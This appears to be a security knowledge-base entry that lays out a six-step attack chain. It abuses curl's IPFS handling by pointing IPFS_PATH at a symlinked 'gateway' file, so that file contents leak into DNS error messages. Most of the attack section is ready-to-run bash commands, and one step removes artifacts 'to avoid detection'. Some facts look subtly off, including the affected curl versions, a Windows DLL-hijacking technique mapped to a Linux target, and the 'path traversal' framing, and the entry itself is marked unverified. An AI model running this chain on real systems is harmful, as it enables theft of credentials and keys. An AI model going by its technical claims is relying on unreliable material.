---
id: 32d973a6-5cd8-42e3-b708-cef17aa1fbc7
name: >-
  Arbitrary File Read via Path Traversal in curl's IPFS Support Using
  Unsanitized IPFS_PATH
type: attack_chain
description: >-
  A multi-stage attack exploiting path traversal in curl's IPFS functionality to
  read arbitrary files by manipulating the IPFS_PATH environment variable,
  leading to sensitive data leakage in error messages.
verified: false
submitted: true
step_count: 6
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:17.082Z'
procedures:
  - '[[procedures/Prepare-Test-File-for-curl-IPFS-Exploitation]]'
  - '[[procedures/Setup-Exploit-Directory-and-Symbolic-Link]]'
  - '[[procedures/Export-Malicious-IPFS_PATH-Environment-Variable]]'
  - '[[procedures/Trigger-Path-Traversal-with-curl-on-IPFS-URL]]'
  - '[[procedures/Cleanup-Exploit-Environment]]'
  - '[[procedures/Execute-Full-Exploit-Script]]'
techniques:
  - '[[File and Directory Discovery]]'
  - '[[DLL Search Order Hijacking]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
tags:
  - path-traversal
  - file-read
  - curl
  - ipfs
  - environment-variable
  - data-leakage
platforms:
  - Linux
tools:
  - '[[tools/curl]]'
  - '[[tools/bash]]'
  - '[[tools/grep]]'
  - '[[tools/mktemp]]'
  - '[[tools/ln]]'
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
  - '[[DLL Search Order Hijacking]]'
---

# Arbitrary File Read via Path Traversal in curl's IPFS Support Using Unsanitized IPFS_PATH

Multi-stage attack chain demonstrating a complete attack workflow exploiting a path traversal vulnerability in curl versions 7.81.0 and later with IPFS support. Attackers manipulate the IPFS_PATH environment variable to include directory traversal sequences, enabling arbitrary file reads via symbolic links or direct traversal, resulting in leakage of sensitive data like SSH keys and credentials in DNS resolution error messages.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Test File] --> B[Setup Exploit Directory and Symlink]
    B --> C[Export Malicious IPFS_PATH]
    C --> D[Trigger curl on IPFS URL]
    D --> E[Leak File Content in Error]
    E --> F[Cleanup]
    F --> G[Execute Full Script]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#9b59b6
    style F fill:#95a5a6
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/bash]]
- [[tools/curl]]
- [[tools/grep]]
- [[tools/mktemp]]
- [[tools/ln]]

### Target Environment

- Linux OS
- curl version 7.81.0 or later with IPFS support enabled
- Access to bash shell in environments like CI/CD pipelines, containers, or shared hosting
- No specific ports or services required beyond local file system access

### Initial Access Requirements

- Local shell access (e.g., via compromised container or pipeline job)
- No network credentials needed; exploitation is local but impacts shared environments
- Prior knowledge of curl's IPFS feature usage in the target system

## Detailed Attack Procedures

### Step 1: Prepare Test File

procedure: [[procedures/Prepare-Test-File-for-curl-IPFS-Exploitation]]

**Objective**: Create a test file with unique content to verify if file contents are leaked in curl error messages.

**Instructions**: Use [[commands/echo-test-content-to-file]] to write a URL-like string including a timestamp to /tmp/test_file.txt for easy detection in DNS errors.

```bash
echo "$TEST_CONTENT" > /tmp/test_file.txt
```

where $TEST_CONTENT is set to something like "http://LEAKED_DATA_$(date +%s).invalid".

**Expected Output**: The file /tmp/test_file.txt is created with the unique content.

**Success Indicators**:
- File exists and contains the expected unique string
- No errors during file creation

### Step 2: Setup Exploit Directory and Symbolic Link

procedure: [[procedures/Setup-Exploit-Directory-and-Symbolic-Link]]

**Objective**: Establish a temporary directory and create a symbolic link mimicking the IPFS gateway path to the target file.

**Instructions**: First, create a temporary directory using [[commands/mktemp-create-directory]]:

```bash
EXPLOIT_DIR=$(mktemp -d)
```

Then, create the symlink with [[commands/ln-create-symlink]]:

```bash
ln -sf /tmp/test_file.txt "$EXPLOIT_DIR/gateway"
```

**Expected Output**: Temporary directory created (e.g., /tmp/tmp.XXXXXX) and symlink established without output.

**Success Indicators**:
- $EXPLOIT_DIR variable holds a valid path
- Symlink $EXPLOIT_DIR/gateway points to /tmp/test_file.txt

### Step 3: Export Malicious IPFS_PATH

procedure: [[procedures/Export-Malicious-IPFS_PATH-Environment-Variable]]

**Objective**: Set the IPFS_PATH to the exploit directory, tricking curl into resolving paths from the symlinked location.

**Instructions**: Export the variable using [[commands/export-ipfs-path]]:

```bash
export IPFS_PATH="$EXPLOIT_DIR"
```

**Expected Output**: Environment variable set with no output.

**Success Indicators**:
- echo $IPFS_PATH shows the exploit directory path
- No syntax errors in export

### Step 4: Trigger Path Traversal with curl

procedure: [[procedures/Trigger-Path-Traversal-with-curl-on-IPFS-URL]]

**Objective**: Execute curl on a dummy IPFS URL to trigger the vulnerability and capture leaked content in error messages.

**Instructions**: Run curl verbosely and grep for errors using [[commands/curl-trigger-ipfs-vuln]]:

```bash
curl -v ipfs://dummycid 2>&1 | grep -A1 "Could not resolve host"
```

**Expected Output**: Error message like "Could not resolve host: LEAKED_DATA_1744992527.invalid" revealing the file content.

**Success Indicators**:
- DNS resolution error contains the unique test string
- Arbitrary file content leaked via the error

### Step 5: Cleanup Exploit Environment

procedure: [[procedures/Cleanup-Exploit-Environment]]

**Objective**: Remove the malicious environment variable and temporary artifacts to avoid detection.

**Instructions**: Unset the variable and delete files using [[commands/unset-ipfs-path]] and [[commands/rm-exploit-artifacts]]:

```bash
unset IPFS_PATH
rm -rf "$EXPLOIT_DIR" /tmp/test_file.txt
```

**Expected Output**: No output; files and variable removed.

**Success Indicators**:
- IPFS_PATH is unset (echo $IPFS_PATH returns empty)
- Temporary files and directory no longer exist

### Step 6: Execute Full Exploit Script

procedure: [[procedures/Execute-Full-Exploit-Script]]

**Objective**: Automate the entire chain by making and running a script that performs all steps.

**Instructions**: Prepare the script with [[commands/chmod-script-executable]]:

```bash
chmod +x data-fetcher.sh
```

Then execute it with [[commands/run-exploit-script]]:

```bash
./data-fetcher.sh
```

**Expected Output**: Script runs, outputs test message, and shows curl error with leaked data.

**Success Indicators**:
- Script executes without permission errors
- Full leakage observed in output

## Attack Chain Summary

### Key Achievements

1. Successful arbitrary file read via path traversal in curl's IPFS handling
2. Leakage of sensitive data in DNS error messages without direct application compromise
3. Demonstration of impact in CI/CD, containers, and shared hosting environments

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[File and Directory Discovery]] File and Directory Discovery (via path traversal to enumerate/read files)
- [[DLL Search Order Hijacking]] Hijack Execution Flow: Environment Variable Manipulation (abusing IPFS_PATH)

### MITRE ATT&CK Tactics

- [[Discovery]] Discovery (locating sensitive files like /etc/passwd or SSH keys)
- [[Collection]] Collection (gathering leaked credentials and system information)

---

*Last updated: 2024-10-01T00:00:00Z*
